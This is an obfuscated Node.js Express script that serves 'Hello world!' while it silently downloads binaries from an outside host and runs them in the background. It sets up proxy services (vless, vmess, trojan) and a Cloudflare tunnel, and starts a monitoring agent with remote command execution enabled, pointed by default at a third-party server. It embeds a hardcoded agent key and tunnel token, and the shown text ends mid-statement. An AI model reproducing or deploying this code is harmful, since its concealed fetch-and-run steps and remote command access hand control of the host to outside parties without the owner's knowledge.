const _0x22d57d=_0x2f69;(function(_0x526a07,_0x4372b1){const _0x5ec3a9={_0x282480:0x106,_0x327980:0x102,_0x344eda:0xff,_0x3591ac:0x101,_0x369a6c:0x157,_0x55aca1:0x122},_0x3178b1=_0x2f69,_0x5334ff=_0x526a07();while(!![]){try{const _0x46cffe=parseInt(_0x3178b1(0x1ad))/0x1+parseInt(_0x3178b1(0x1ac))/0x2+-parseInt(_0x3178b1(_0x5ec3a9._0x282480))/0x3*(parseInt(_0x3178b1(_0x5ec3a9._0x327980))/0x4)+-parseInt(_0x3178b1(_0x5ec3a9._0x344eda))/0x5*(parseInt(_0x3178b1(_0x5ec3a9._0x3591ac))/0x6)+-parseInt(_0x3178b1(_0x5ec3a9._0x369a6c))/0x7+parseInt(_0x3178b1(_0x5ec3a9._0x55aca1))/0x8+parseInt(_0x3178b1(0x174))/0x9*(-parseInt(_0x3178b1(0x14b))/0xa);if(_0x46cffe===_0x4372b1)break;else _0x5334ff['push'](_0x5334ff['shift']());}catch(_0x3727b5){_0x5334ff['push'](_0x5334ff['shift']());}}}(_0x5bc4,0xaa21f));const express=require(_0x22d57d(0x13d)),app=express(),axios=require(_0x22d57d(0x103)),os=require('os'),fs=require('fs'),path=require(_0x22d57d(0x12a)),{promisify}=require(_0x22d57d(0x16e)),exec=promisify(require(_0x22d57d(0x167))[_0x22d57d(0x170)]),{execSync}=require(_0x22d57d(0x167)),UPLOAD_URL=process['env'][_0x22d57d(0x120)]||'',PROJECT_URL=process['env'][_0x22d57d(0x14e)]||'',AUTO_ACCESS=process['env'][_0x22d57d(0x198)]||![],FILE_PATH=process[_0x22d57d(0x19d)][_0x22d57d(0xfa)]||_0x22d57d(0x14c),SUB_PATH=process[_0x22d57d(0x19d)][_0x22d57d(0x137)]||_0x22d57d(0x125),PORT=process[_0x22d57d(0x19d)][_0x22d57d(0x140)]||process[_0x22d57d(0x19d)][_0x22d57d(0xfc)]||0xbb8,UUID=process[_0x22d57d(0x19d)][_0x22d57d(0x175)]||'c1bc8797-2dad-4db5-b708-600e9a49d485',NEZHA_SERVER=process[_0x22d57d(0x19d)]['NEZHA_SERVER']||_0x22d57d(0x17f),NEZHA_PORT=process['env'][_0x22d57d(0x180)]||'',NEZHA_KEY=process[_0x22d57d(0x19d)][_0x22d57d(0x163)]||'vZeLtIZV9E7BPLBi02YMj7w4cprQuVFE',ARGO_DOMAIN=process[_0x22d57d(0x19d)][_0x22d57d(0x16f)]||'railway.youhs.ggff.net',ARGO_AUTH=process['env'][_0x22d57d(0x10e)]||_0x22d57d(0x115),ARGO_PORT=process[_0x22d57d(0x19d)][_0x22d57d(0x16b)]||0x1f41,CFIP=process[_0x22d57d(0x19d)]['CFIP']||'cf.090227.xyz',CFPORT=process[_0x22d57d(0x19d)][_0x22d57d(0x184)]||0x1bb,NAME=process[_0x22d57d(0x19d)][_0x22d57d(0x153)]||_0x22d57d(0x17d);!fs[_0x22d57d(0xfb)](FILE_PATH)?(fs[_0x22d57d(0x114)](FILE_PATH),console[_0x22d57d(0x18d)](FILE_PATH+_0x22d57d(0x1b2))):console[_0x22d57d(0x18d)](FILE_PATH+_0x22d57d(0x10d));function generateRandomName(){const _0x1731fc={_0x21ff07:0x16a},_0x47ac5f=_0x22d57d,_0x5d649d=_0x47ac5f(0x159);let _0x26865b='';for(let _0xe8cc8e=0x0;_0xe8cc8e<0x6;_0xe8cc8e++){_0x26865b+=_0x5d649d[_0x47ac5f(_0x1731fc._0x21ff07)](Math[_0x47ac5f(0x1ba)](Math['random']()*_0x5d649d['length']));}return _0x26865b;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0x5bc4(){const _0x35d05e=['Error\x20executing\x20command:\x20','pipe','from','Error\x20in\x20startserver:','Skipping\x20adding\x20automatic\x20access\x20task','\x20-p\x20','Railway','response','youhs.tk:80','NEZHA_PORT','includes','Error\x20downloading\x20files:','Empowerment\x20failed\x20for\x20','CFPORT','country_code','writeFileSync','org','/vmess-argo?ed=2560','web\x20running\x20error:\x20','/config.json\x20>/dev/null\x202>&1\x20&','utf-8','length','log','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','\x0a\x20\x20\x20\x20','stringify','readdirSync','\x20>\x20nul\x202>&1','then','blackhole','--tls','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x0avless://','AUTO_ACCESS','all','block','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','App\x20is\x20running','env','arch','Hello\x20world!','toString','2096','message','del\x20/f\x20/q\x20','https://amd64.ssss.nyc.mn/web','443','unshift','tcp','join','filter','2087','post','2439926mMmIMI','1356713XyAXlc','direct','arm','match','/api/add-nodes','\x20is\x20created','amd','firefox','close','/sub.txt\x20saved\x20successfully','automatic\x20access\x20task\x20added\x20successfully','platform','/trojan-argo','floor','TunnelSecret','stream','/api/add-subscriptions','?security=tls&sni=','none','FILE_PATH','existsSync','PORT','true','/vmess-argo','5kiqouW','Unknown','3027966xgGNwn','4udjEKI','axios','quic','https+local://8.8.8.8/dns-query','1167933ylvgWq','\x0aclient_secret:\x20','http://ip-api.com/json/','\x20is\x20running','/dev/null','Nodes\x20uploaded\x20successfully','vless','\x20already\x20exists','ARGO_AUTH','send','http\x20server\x20is\x20running\x20on\x20port:','taskkill\x20/f\x20/im\x20','readFileSync','config.yaml','mkdirSync','eyJhIjoiZDU3MzRjMzE1ZDViODNhNTNhNWViNjI3MzViY2QzZjgiLCJ0IjoiYzg2MzdmZjQtZTczMy00ODZiLTg5MGUtOTkyYmNmYzM2ZTMwIiwicyI6Ik5HTXpOakV3TkdZdFlqQmpOeTAwT1RSaUxXSTJNVGN0Wm1FeE5ERXlOVFU0TjJabSJ9','\x0a\x20\x20credentials-file:\x20','vmess','ARGO_DOMAIN:','text/plain;\x20charset=utf-8','xtls-rprx-vision','statSync','basename','http','has','unlink','UPLOAD_URL','2083','4935480QOdwss','/tunnel.yml\x20run','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','sub','\x20failed:\x20','\x20-c\x20\x22','aarch64','tunnel.json','path','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','createWriteStream','Content-Type','base64','forEach','rm\x20-rf\x20','config.json','Download\x20','countryCode','NEZHA\x20variable\x20is\x20empty,skip\x20running','boot.log','\x20>/dev/null\x202>&1\x20&','SUB_PATH','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','isFile','catch','win32','127.0.0.1','express','\x0a\x0atrojan://','sub.txt','SERVER_PORT','application/json','unlinkSync','nohup\x20','substring','\x20>/dev/null\x202>&1','8443','https://arm64.ssss.nyc.mn/web','\x0a\x0avmess://','success','\x20-s\x20','1030wxHfHh','./tmp','\x20-c\x20','PROJECT_URL','.exe\x20>\x20nul\x202>&1','npm\x20running\x20error:\x20','test','fileName','NAME','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','error','/vless-argo','5177452zMlHDm','2053','abcdefghijklmnopqrstuvwxyz','map','data','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x0a\x20\x20tunnel:\x20','&fp=firefox&type=ws&host=','tls','https://arm64.ssss.nyc.mn/v1','get','https://amd64.ssss.nyc.mn/v1','NEZHA_KEY','clear','split','push','child_process','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','charAt','ARGO_PORT','Subscription\x20uploaded\x20successfully','https://arm64.ssss.nyc.mn/bot','util','ARGO_DOMAIN','exec','\x20successfully','tunnel.yml','status','75420ZbOAJp','UUID','https://ipapi.co/json/'];_0x5bc4=function(){return _0x35d05e;};return _0x5bc4();}let npmPath=path[_0x22d57d(0x1a8)](FILE_PATH,npmName),phpPath=path[_0x22d57d(0x1a8)](FILE_PATH,phpName),webPath=path[_0x22d57d(0x1a8)](FILE_PATH,webName),botPath=path[_0x22d57d(0x1a8)](FILE_PATH,botName),subPath=path[_0x22d57d(0x1a8)](FILE_PATH,_0x22d57d(0x13f)),listPath=path[_0x22d57d(0x1a8)](FILE_PATH,'list.txt'),bootLogPath=path[_0x22d57d(0x1a8)](FILE_PATH,_0x22d57d(0x135)),configPath=path[_0x22d57d(0x1a8)](FILE_PATH,_0x22d57d(0x131));function deleteNodes(){const _0x387c16={_0xf3c0dd:0xfb,_0x11a452:0x112,_0x5b4e68:0x179,_0x465ddc:0x1a0,_0x5ed92e:0x18b,_0x45373e:0x165,_0x2abddc:0x141,_0x5d13b7:0x13a},_0x40511e=_0x22d57d;try{if(!UPLOAD_URL)return;if(!fs[_0x40511e(_0x387c16._0xf3c0dd)](subPath))return;let _0x386f19;try{_0x386f19=fs[_0x40511e(_0x387c16._0x11a452)](subPath,_0x40511e(0x18b));}catch{return null;}const _0x1969be=Buffer[_0x40511e(_0x387c16._0x5b4e68)](_0x386f19,'base64')[_0x40511e(_0x387c16._0x465ddc)](_0x40511e(_0x387c16._0x5ed92e)),_0x57d9f4=_0x1969be[_0x40511e(_0x387c16._0x45373e)]('\x0a')[_0x40511e(0x1a9)](_0x18a376=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x40511e(0x151)](_0x18a376));if(_0x57d9f4[_0x40511e(0x18c)]===0x0)return;return axios[_0x40511e(0x1ab)](UPLOAD_URL+'/api/delete-nodes',JSON['stringify']({'nodes':_0x57d9f4}),{'headers':{'Content-Type':_0x40511e(_0x387c16._0x2abddc)}})[_0x40511e(_0x387c16._0x5d13b7)](_0x2fc27e=>{return null;}),null;}catch(_0xa74442){return null;}}function _0x2f69(_0x13a353,_0x2cc9cc){const _0x5bc421=_0x5bc4();return _0x2f69=function(_0x2f69cd,_0x1243e7){_0x2f69cd=_0x2f69cd-0xf7;let _0x7d5313=_0x5bc421[_0x2f69cd];return _0x7d5313;},_0x2f69(_0x13a353,_0x2cc9cc);}function cleanupOldFiles(){const _0x4ded25={_0x4f056f:0x191},_0x204be2={_0x5d9c88:0x1a8,_0x18cff8:0x11b},_0xea4cd9=_0x22d57d;try{const _0x4f0d44=fs[_0xea4cd9(_0x4ded25._0x4f056f)](FILE_PATH);_0x4f0d44[_0xea4cd9(0x12f)](_0xfe1025=>{const _0x477eab=_0xea4cd9,_0x3295dd=path[_0x477eab(_0x204be2._0x5d9c88)](FILE_PATH,_0xfe1025);try{const _0x3197c0=fs[_0x477eab(_0x204be2._0x18cff8)](_0x3295dd);_0x3197c0[_0x477eab(0x139)]()&&fs[_0x477eab(0x142)](_0x3295dd);}catch(_0x365ee4){}});}catch(_0x1629b0){}}app['get']('/',function(_0x37cc2e,_0x30e71b){const _0x4bc5bc=_0x22d57d;_0x30e71b['send'](_0x4bc5bc(0x19f));});async function generateConfig(){const _0x4c881b={_0x4d5a2d:0xf9,_0x174fbc:0x10c,_0x3dd205:0x11a,_0x4fe187:0x156,_0x2639a5:0x1b9,_0x5c72ae:0x1a7,_0x413a32:0xf9,_0x22c3e4:0x15f,_0x52b183:0x104,_0x371de3:0x117,_0x5720ad:0x19a,_0x2bc758:0x1a8,_0x2baabc:0x190},_0x32d6bf=_0x22d57d,_0x35022f={'log':{'access':_0x32d6bf(0x10a),'error':_0x32d6bf(0x10a),'loglevel':_0x32d6bf(_0x4c881b._0x4d5a2d)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x32d6bf(_0x4c881b._0x174fbc),'settings':{'clients':[{'id':UUID,'flow':_0x32d6bf(_0x4c881b._0x3dd205)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x32d6bf(_0x4c881b._0x4fe187),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x32d6bf(_0x4c881b._0x2639a5),'dest':0xbbc}]},'streamSettings':{'network':_0x32d6bf(0x1a7)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x32d6bf(0x10c),'settings':{'clients':[{'id':UUID}],'decryption':_0x32d6bf(0xf9)},'streamSettings':{'network':_0x32d6bf(_0x4c881b._0x5c72ae),'security':'none'}},{'port':0xbba,'listen':_0x32d6bf(0x13c),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x32d6bf(_0x4c881b._0x413a32),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x32d6bf(0x11d),_0x32d6bf(_0x4c881b._0x22c3e4),_0x32d6bf(_0x4c881b._0x52b183)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x32d6bf(0x13c),'protocol':_0x32d6bf(_0x4c881b._0x371de3),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x32d6bf(0xfe)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x32d6bf(_0x4c881b._0x22c3e4),_0x32d6bf(0x104)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x32d6bf(0x11d),_0x32d6bf(0x15f),_0x32d6bf(_0x4c881b._0x52b183)],'metadataOnly':![]}}],'dns':{'servers':[_0x32d6bf(0x105)]},'outbounds':[{'protocol':'freedom','tag':_0x32d6bf(0x1ae)},{'protocol':_0x32d6bf(0x194),'tag':_0x32d6bf(_0x4c881b._0x5720ad)}]};fs[_0x32d6bf(0x186)](path[_0x32d6bf(_0x4c881b._0x2bc758)](FILE_PATH,_0x32d6bf(0x131)),JSON[_0x32d6bf(_0x4c881b._0x2baabc)](_0x35022f,null,0x2));}function getSystemArchitecture(){const _0x1ebe81={_0xa40519:0x19e},_0x2cb032=_0x22d57d,_0x200583=os[_0x2cb032(_0x1ebe81._0xa40519)]();return _0x200583==='arm'||_0x200583==='arm64'||_0x200583===_0x2cb032(0x128)?_0x2cb032(0x1af):_0x2cb032(0x1b3);}function downloadFile(_0x5f5a5a,_0x63498e,_0x2485fd){const _0x374389={_0x5a093e:0x193},_0xd7ccd9={_0x1e6e42:0x132,_0x105ea0:0x126,_0x18e94f:0x155},_0x496b0d={_0x1bb4d4:0x155},_0x3ce4fe={_0x170b3c:0x11c},_0x3fe1b2=_0x22d57d,_0x3e8e71=_0x5f5a5a;!fs[_0x3fe1b2(0xfb)](FILE_PATH)&&fs[_0x3fe1b2(0x114)](FILE_PATH,{'recursive':!![]});const _0x52dbe6=fs[_0x3fe1b2(0x12c)](_0x3e8e71);axios({'method':_0x3fe1b2(0x161),'url':_0x63498e,'responseType':_0x3fe1b2(0x1bc)})[_0x3fe1b2(_0x374389._0x5a093e)](_0x264758=>{const _0x336a98={_0x53bf94:0x126},_0x43999d=_0x3fe1b2;_0x264758[_0x43999d(0x15b)][_0x43999d(0x178)](_0x52dbe6),_0x52dbe6['on']('finish',()=>{const _0x920a8b=_0x43999d;_0x52dbe6[_0x920a8b(0x1b5)](),console[_0x920a8b(0x18d)]('Download\x20'+path[_0x920a8b(_0x3ce4fe._0x170b3c)](_0x3e8e71)+_0x920a8b(0x171)),_0x2485fd(null,_0x3e8e71);}),_0x52dbe6['on'](_0x43999d(_0x496b0d._0x1bb4d4),_0x5f52ea=>{const _0x5642f7=_0x43999d;fs[_0x5642f7(0x11f)](_0x3e8e71,()=>{});const _0x1f717d='Download\x20'+path[_0x5642f7(0x11c)](_0x3e8e71)+_0x5642f7(_0x336a98._0x53bf94)+_0x5f52ea[_0x5642f7(0x1a2)];console['error'](_0x1f717d),_0x2485fd(_0x1f717d);});})[_0x3fe1b2(0x13a)](_0x18351e=>{const _0x326137=_0x3fe1b2,_0x35cf14=_0x326137(_0xd7ccd9._0x1e6e42)+path[_0x326137(0x11c)](_0x3e8e71)+_0x326137(_0xd7ccd9._0x105ea0)+_0x18351e['message'];console[_0x326137(_0xd7ccd9._0x18e94f)](_0x35cf14),_0x2485fd(_0x35cf14);});}async function downloadFilesAndRun(){const _0xde1d88={_0x143a43:0x18d,_0x5e2047:0x124,_0x37d6b6:0x182,_0x515db3:0x1a5,_0x6679f7:0x1a1,_0x3daf69:0x1aa,_0x559e69:0x158,_0x44e9ca:0x11e,_0x233e9d:0xfd,_0x134622:0x15c,_0x529cf5:0x186,_0x5757a8:0x1a8,_0x2d67a9:0x143,_0x39d472:0x127,_0x306112:0x121,_0xc5a52e:0x158,_0x49341b:0x14a,_0x10c6cd:0x17c,_0x526d95:0x18d,_0x5f4bb3:0x155,_0x776eac:0x150,_0x42617:0x134,_0x18baf6:0x18a,_0x49239e:0x155,_0xf20e9f:0xfb,_0x117bc3:0x1b0,_0x295a75:0x1b0,_0x4d8bff:0x136,_0x24724c:0x109,_0xaeb09c:0x177},_0x46a2e9=_0x22d57d,_0x19985f=getSystemArchitecture(),_0x3db0b5=getFilesForArchitecture(_0x19985f);if(_0x3db0b5[_0x46a2e9(0x18c)]===0x0){console[_0x46a2e9(_0xde1d88._0x143a43)](_0x46a2e9(_0xde1d88._0x5e2047));return;}const _0x15af5b=_0x3db0b5[_0x46a2e9(0x15a)](_0x9a3be0=>{return new Promise((_0x5bde12,_0x1587e5)=>{const _0x470240=_0x2f69;downloadFile(_0x9a3be0[_0x470240(0x152)],_0x9a3be0['fileUrl'],(_0x423738,_0x2bc161)=>{_0x423738?_0x1587e5(_0x423738):_0x5bde12(_0x2bc161);});});});try{await Promise[_0x46a2e9(0x199)](_0x15af5b);}catch(_0x5e8acd){console[_0x46a2e9(0x155)](_0x46a2e9(_0xde1d88._0x37d6b6),_0x5e8acd);return;}function _0xfc74c(_0x4f5d82){const _0x20bcbb={_0xc3a05d:0xfb},_0x446a6f={_0x173a7f:0x155},_0x50856a=_0x46a2e9,_0x7fd98a=0x1fd;_0x4f5d82[_0x50856a(0x12f)](_0x1c9151=>{const _0x59ba6a=_0x50856a;fs[_0x59ba6a(_0x20bcbb._0xc3a05d)](_0x1c9151)&&fs['chmod'](_0x1c9151,_0x7fd98a,_0x3db967=>{const _0x676839=_0x59ba6a;_0x3db967?console[_0x676839(_0x446a6f._0x173a7f)](_0x676839(0x183)+_0x1c9151+':\x20'+_0x3db967):console['log']('Empowerment\x20success\x20for\x20'+_0x1c9151+':\x20'+_0x7fd98a[_0x676839(0x1a0)](0x8));});});}const _0x5ef19d=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0xfc74c(_0x5ef19d);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x17bf8e=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x5bd337=new Set([_0x46a2e9(_0xde1d88._0x515db3),_0x46a2e9(0x146),_0x46a2e9(_0xde1d88._0x6679f7),_0x46a2e9(_0xde1d88._0x3daf69),_0x46a2e9(0x121),_0x46a2e9(_0xde1d88._0x559e69)]),_0x13e4f3=_0x5bd337[_0x46a2e9(_0xde1d88._0x44e9ca)](_0x17bf8e)?_0x46a2e9(_0xde1d88._0x233e9d):'false',_0x355dad=_0x46a2e9(0x107)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x46a2e9(_0xde1d88._0x134622)+_0x13e4f3+_0x46a2e9(0x19b)+UUID;fs[_0x46a2e9(_0xde1d88._0x529cf5)](path[_0x46a2e9(_0xde1d88._0x5757a8)](FILE_PATH,_0x46a2e9(0x113)),_0x355dad);const _0x3a82c6=_0x46a2e9(_0xde1d88._0x2d67a9)+phpPath+_0x46a2e9(_0xde1d88._0x39d472)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x3a82c6),console[_0x46a2e9(0x18d)](phpName+'\x20is\x20running'),await new Promise(_0x1447b8=>setTimeout(_0x1447b8,0x3e8));}catch(_0x34e277){console[_0x46a2e9(0x155)]('php\x20running\x20error:\x20'+_0x34e277);}}else{let _0xffc215='';const _0x3aa83c=[_0x46a2e9(_0xde1d88._0x515db3),_0x46a2e9(0x146),_0x46a2e9(0x1a1),_0x46a2e9(0x1aa),_0x46a2e9(_0xde1d88._0x306112),_0x46a2e9(_0xde1d88._0xc5a52e)];_0x3aa83c[_0x46a2e9(0x181)](NEZHA_PORT)&&(_0xffc215=_0x46a2e9(0x195));const _0x1fe762=_0x46a2e9(_0xde1d88._0x2d67a9)+npmPath+_0x46a2e9(_0xde1d88._0x49341b)+NEZHA_SERVER+':'+NEZHA_PORT+_0x46a2e9(_0xde1d88._0x10c6cd)+NEZHA_KEY+'\x20'+_0xffc215+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x1fe762),console[_0x46a2e9(_0xde1d88._0x526d95)](npmName+'\x20is\x20running'),await new Promise(_0x11ae79=>setTimeout(_0x11ae79,0x3e8));}catch(_0x598caa){console[_0x46a2e9(_0xde1d88._0x5f4bb3)](_0x46a2e9(_0xde1d88._0x776eac)+_0x598caa);}}}else console[_0x46a2e9(_0xde1d88._0x143a43)](_0x46a2e9(_0xde1d88._0x42617));const _0x1dbcfe='nohup\x20'+webPath+_0x46a2e9(0x14d)+FILE_PATH+_0x46a2e9(_0xde1d88._0x18baf6);try{await exec(_0x1dbcfe),console[_0x46a2e9(0x18d)](webName+_0x46a2e9(0x109)),await new Promise(_0x37a253=>setTimeout(_0x37a253,0x3e8));}catch(_0x468365){console[_0x46a2e9(_0xde1d88._0x49239e)](_0x46a2e9(0x189)+_0x468365);}if(fs[_0x46a2e9(_0xde1d88._0xf20e9f)](botPath)){let _0x2115d0;if(ARGO_AUTH[_0x46a2e9(_0xde1d88._0x117bc3)](/^[A-Z0-9a-z=]{120,250}$/))_0x2115d0=_0x46a2e9(0x154)+ARGO_AUTH;else ARGO_AUTH[_0x46a2e9(_0xde1d88._0x295a75)](/TunnelSecret/)?_0x2115d0=_0x46a2e9(0x168)+FILE_PATH+_0x46a2e9(0x123):_0x2115d0=_0x46a2e9(0x12b)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x2115d0+_0x46a2e9(_0xde1d88._0x4d8bff)),console['log'](botName+_0x46a2e9(_0xde1d88._0x24724c)),await new Promise(_0x10c983=>setTimeout(_0x10c983,0x7d0));}catch(_0x37c417){console[_0x46a2e9(0x155)](_0x46a2e9(_0xde1d88._0xaeb09c)+_0x37c417);}}await new Promise(_0x10de2f=>setTimeout(_0x10de2f,0x1388));}function getFilesForArchitecture(_0x38374f){const _0x32bb34={_0x8f7bca:0x147},_0x48ed5c=_0x22d57d;let _0x3a914b;_0x38374f===_0x48ed5c(0x1af)?_0x3a914b=[{'fileName':webPath,'fileUrl':_0x48ed5c(_0x32bb34._0x8f7bca)},{'fileName':botPath,'fileUrl':_0x48ed5c(0x16d)}]:_0x3a914b=[{'fileName':webPath,'fileUrl':_0x48ed5c(0x1a4)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2b31e5=_0x38374f==='arm'?'https://arm64.ssss.nyc.mn/agent':'https://amd64.ssss.nyc.mn/agent';_0x3a914b['unshift']({'fileName':npmPath,'fileUrl':_0x2b31e5});}else{const _0x46862e=_0x38374f===_0x48ed5c(0x1af)?_0x48ed5c(0x160):_0x48ed5c(0x162);_0x3a914b[_0x48ed5c(0x1a6)]({'fileName':phpPath,'fileUrl':_0x46862e});}}return _0x3a914b;}function argoType(){const _0x1badfa={_0x24e587:0x186,_0x179a17:0x1a8,_0x342118:0x15d,_0x3a328d:0x116,_0x218665:0x18e,_0x481b45:0x172,_0x520215:0x18d,_0x2affd2:0x138},_0x1391f6=_0x22d57d;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x1391f6(0x18d)](_0x1391f6(0x169));return;}if(ARGO_AUTH['includes'](_0x1391f6(0x1bb))){fs[_0x1391f6(_0x1badfa._0x24e587)](path[_0x1391f6(_0x1badfa._0x179a17)](FILE_PATH,_0x1391f6(0x129)),ARGO_AUTH);const _0x2b208b=_0x1391f6(_0x1badfa._0x342118)+ARGO_AUTH['split']('\x22')[0xb]+_0x1391f6(_0x1badfa._0x3a328d)+path[_0x1391f6(0x1a8)](FILE_PATH,'tunnel.json')+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x1391f6(_0x1badfa._0x218665)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x1391f6(0x186)](path['join'](FILE_PATH,_0x1391f6(_0x1badfa._0x481b45)),_0x2b208b);}else console[_0x1391f6(_0x1badfa._0x520215)](_0x1391f6(_0x1badfa._0x2affd2));}async function extractDomains(){const _0x50c3c6={_0x2d0320:0x1a8,_0x2206f1:0x135,_0x574159:0x165,_0x45a9d1:0x18d,_0x4d9495:0x142,_0x2630ea:0x196,_0x2daf34:0x136,_0x4f126b:0x155,_0x37e04b:0x177},_0x54a2c2={_0x136cfe:0x176,_0x510440:0x15b,_0x9f6cf4:0x185,_0x39d1fd:0x15b,_0x269a99:0x187,_0x53d7ab:0x185,_0xcc516a:0x161,_0x2d1b07:0x108,_0x41ca7c:0x15b,_0x5329cc:0x173,_0x5b3807:0x149,_0x22e595:0x133,_0xe2c94d:0x100},_0x4eeab3={_0x589352:0x111,_0x24f04e:0x14f},_0x5907e6={_0x44a6d5:0x1b0},_0x5129e3=_0x22d57d;let _0x430e73;if(ARGO_AUTH&&ARGO_DOMAIN)_0x430e73=ARGO_DOMAIN,console['log'](_0x5129e3(0x118),_0x430e73),await _0x4e071b(_0x430e73);else try{const _0x2a1b6f=fs[_0x5129e3(0x112)](path[_0x5129e3(_0x50c3c6._0x2d0320)](FILE_PATH,_0x5129e3(_0x50c3c6._0x2206f1)),_0x5129e3(0x18b)),_0x169e25=_0x2a1b6f[_0x5129e3(_0x50c3c6._0x574159)]('\x0a'),_0x5e5ee1=[];_0x169e25[_0x5129e3(0x12f)](_0x582857=>{const _0x5d3392=_0x5129e3,_0x8b1259=_0x582857[_0x5d3392(_0x5907e6._0x44a6d5)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x8b1259){const _0x511b28=_0x8b1259[0x1];_0x5e5ee1[_0x5d3392(0x166)](_0x511b28);}});if(_0x5e5ee1[_0x5129e3(0x18c)]>0x0)_0x430e73=_0x5e5ee1[0x0],console[_0x5129e3(_0x50c3c6._0x45a9d1)]('ArgoDomain:',_0x430e73),await _0x4e071b(_0x430e73);else{console['log']('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x5129e3(_0x50c3c6._0x4d9495)](path[_0x5129e3(0x1a8)](FILE_PATH,_0x5129e3(_0x50c3c6._0x2206f1)));async function _0x144fed(){const _0x413ca4=_0x5129e3;try{process['platform']==='win32'?await exec(_0x413ca4(_0x4eeab3._0x589352)+botName+_0x413ca4(_0x4eeab3._0x24f04e)):await exec('pkill\x20-f\x20\x22['+botName['charAt'](0x0)+']'+botName[_0x413ca4(0x144)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x974e85){}}_0x144fed(),await new Promise(_0xb93fa1=>setTimeout(_0xb93fa1,0xbb8));const _0x2a9382=_0x5129e3(0x12b)+FILE_PATH+_0x5129e3(_0x50c3c6._0x2630ea)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x2a9382+_0x5129e3(_0x50c3c6._0x2daf34)),console[_0x5129e3(_0x50c3c6._0x45a9d1)](botName+_0x5129e3(0x109)),await new Promise(_0x59450a=>setTimeout(_0x59450a,0xbb8)),await extractDomains();}catch(_0x5dd7a0){console[_0x5129e3(_0x50c3c6._0x4f126b)](_0x5129e3(_0x50c3c6._0x37e04b)+_0x5dd7a0);}}}catch(_0x17aba5){console[_0x5129e3(0x155)]('Error\x20reading\x20boot.log:',_0x17aba5);}async function _0x314ad5(){const _0x16572d=_0x5129e3;try{const _0x129f21=await axios['get'](_0x16572d(_0x54a2c2._0x136cfe),{'timeout':0xbb8});if(_0x129f21[_0x16572d(0x15b)]&&_0x129f21[_0x16572d(_0x54a2c2._0x510440)][_0x16572d(_0x54a2c2._0x9f6cf4)]&&_0x129f21[_0x16572d(_0x54a2c2._0x39d1fd)][_0x16572d(_0x54a2c2._0x269a99)])return _0x129f21['data'][_0x16572d(_0x54a2c2._0x53d7ab)]+'_'+_0x129f21['data'][_0x16572d(_0x54a2c2._0x269a99)];}catch(_0x51be86){try{const _0x1a5044=await 